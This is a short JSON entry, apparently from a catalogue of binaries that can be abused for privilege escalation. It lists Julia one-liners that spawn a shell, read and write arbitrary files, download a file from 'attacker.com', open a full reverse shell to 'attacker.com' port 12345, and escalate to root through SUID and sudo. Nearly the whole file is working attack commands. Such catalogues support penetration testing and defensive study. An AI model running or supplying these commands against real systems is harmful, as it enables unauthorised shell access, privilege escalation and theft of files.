{
  "functions": {
    "shell": [
      {
        "code": "julia -e 'run(`/bin/sh`)'\n"
      }
    ],
    "file-read": [
      {
        "code": "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'\n"
      }
    ],
    "file-write": [
      {
        "code": "export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'\n"
      }
    ],
    "file-download": [
      {
        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'\n"
      }
    ],
    "reverse-shell": [
      {
        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\njulia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"
      }
    ],
    "suid": [
      {
        "code": "./julia -e 'run(`/bin/sh -p`)'\n"
      }
    ],
    "sudo": [
      {
        "code": "sudo julia -e 'run(`/bin/sh`)'\n"
      }
    ]
  }
}
